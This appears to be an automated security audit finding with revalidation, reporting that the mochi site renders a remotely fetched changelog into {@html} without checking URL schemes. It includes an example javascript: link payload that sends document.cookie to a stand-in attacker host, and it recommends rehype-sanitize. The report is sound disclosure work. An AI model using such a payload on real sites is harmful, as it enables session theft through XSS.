# [MEDIUM] Remote CHANGELOG.md is rendered into {@html} without URL-scheme sanitization, allowing javascript: links via a merged commit subject

**File:** [`packages/site/src/lib/changelog.ts`](https://github.com/khromov/mochi/blob/main/packages/site/src/lib/changelog.ts#L4-L46) (lines 4, 38, 46)
**Project:** mochi
**Severity:** MEDIUM  •  **Confidence:** medium  •  **Slug:** `xss`

## Owners

**Suggested assignee:** `stanislav.khromov+github@gmail.com` _(via last-committer)_

## Finding

`getChangelogHtml()` fetches `CHANGELOG_URL` — `raw.githubusercontent.com/khromov/mochi/refs/heads/main/packages/mochi/CHANGELOG.md` — at runtime, pipes it through `renderMarkdown()` (markdown.ts:51), and the result is injected with `{@html html}` at `Docs.svelte:63` for `/docs/changelog/`. There is no sanitizer in the pipeline: `renderMarkdown` runs only `rehypeSlug`, `rehypeExternalLinks` and a `capture` stringifier, and `rehype-sanitize` is absent from the project.

Raw-tag injection is blocked, but only incidentally: mdsvex sets `allowDangerousHtml: true` in its `remark2rehype` (mdsvex dist line 24558) so HTML in the markdown becomes hast `raw` nodes, and `markdown.ts:56` calls `toHtml(tree)` with no options, so `allowDangerousHtml` defaults to false and `hast-util-to-html`'s raw handler escapes those nodes as text. Nobody states that dependency, so adding `allowDangerousHtml: true` to match mdsvex — an entirely natural "make runtime markdown match the docs" change — silently upgrades this to full stored XSS from a remote source.

What gets through today are element attributes produced by markdown syntax, which are escaped for quotes but never scheme-checked. `[click me](javascript:fetch('//attacker/'+document.cookie))` in the changelog renders as a live `<a href="javascript:...">` on https://mochi.fast/docs/changelog/, executing in the site's origin on click. `rehypeExternalLinks` does not help and in fact steps aside: `isInternalLink()` returns true for any non-http(s) protocol (rehypeExternalLinks.ts:17-19), so `javascript:` URLs are classified "internal" and left entirely untouched.

The trust assumption is written down at `Docs.svelte:62` — "first-party markdown (our own CHANGELOG.md)". That holds for the repo but not for the content: CHANGELOG.md is release-please-generated from Conventional Commit subjects, so the commit message of any merged external PR lands in it verbatim. Likelihood is low (needs a merged PR plus a victim click) but the blast radius is the whole mochi.fast origin, and this is the only path on the site where runtime-fetched remote text reaches `{@html}`.

## Recommendation

Treat the fetched changelog as untrusted input. Add `rehype-sanitize` (its default GitHub schema allows exactly the subset release-please emits and strips non-http(s) URL schemes) to the `rehypePlugins` array in `markdown.ts:62`, before `capture`. At minimum, add a rehype pass that drops or neutralizes any `a[href]`/`img[src]` whose scheme is not http/https/mailto, and add a comment at `markdown.ts:56` recording that the bare `toHtml(tree)` call is load-bearing for raw-node escaping so it is not "fixed" later.

## Revalidation

**Verdict:** true-positive

I verified the sink and every mitigation claim against library source rather than taking the finding's word for it. `changelog.ts:18` fetches `CHANGELOG_URL` (raw.githubusercontent.com, `refs/heads/main`) at request time, L46 pipes it through `renderMarkdown`, and `Docs.svelte:63` injects the result with `{@html html}` for `/docs/changelog/`. No sanitizer exists in the project: `rehype-sanitize`, `sanitize-html` and `DOMPurify` are absent from every `package.json`, and the only `*sanitize*` module in `node_modules` is the transitive `micromark-util-sanitize-uri`. Raw-tag injection is in fact blocked, and incidentally so: `mdsvex/dist/main-Bo3idoP1.js:24556-24559` configures `remark2rehype` with `allowDangerousHtml: true` (so HTML becomes hast `raw` nodes), but `markdown.ts:56` calls `toHtml(tree)` with no options and `hast-util-to-html/lib/index.js:204` defaults `allowDangerousHtml` to `false`, whose `handle/raw.js` then routes raw nodes through the `text` serializer. URL schemes, however, are never checked: `mdast-util-to-hast/lib/handlers/link.js` sets `href` via `normalizeUri` only (percent-encoding, not the protocol-filtering `sanitizeUri`), mdsvex's own `external` plugin is configured `{target: false, rel: ['nofollow']}` and only adds `rel`, and this project's `rehypeExternalLinks.ts:17-19` classifies any non-http(s) protocol as 'internal' and returns before touching the node. So `[x](javascript:alert(1))` in the changelog serialises as a live `<a href="javascript:alert(1)">` on https://mochi.fast/docs/changelog/, and I confirmed there is no CSP on `packages/site` to stop it (the repo's only `Content-Security-Policy` is `packages/support/src/embedHeaders.ts`'s `frame-ancestors`). The untrusted-input path is genuine: the live `packages/mochi/CHANGELOG.md` shows release-please writing commit subjects verbatim into markdown bullets, with only Handlebars' HTML escaping applied (visible as `svelte-shaker &gt;=0.18.1`) — which touches `< > & " ' \``  but not `[`, `]`, `(`, `)` or `:`, so markdown link syntax in a squash-merged PR title survives intact. Preconditions keep real-world likelihood low (a maintainer must merge a PR whose title embeds the link, and a visitor must click it) and the site carries no session worth stealing beyond the `hunter2` demo cookie, which is why I am not raising severity — but the defect is real, the sink is unguarded, and the impact is script execution in the mochi.fast origin.

## Recent committers (`git log`)

- Stanislav Khromov <stanislav.khromov+github@gmail.com> (2026-07-27)
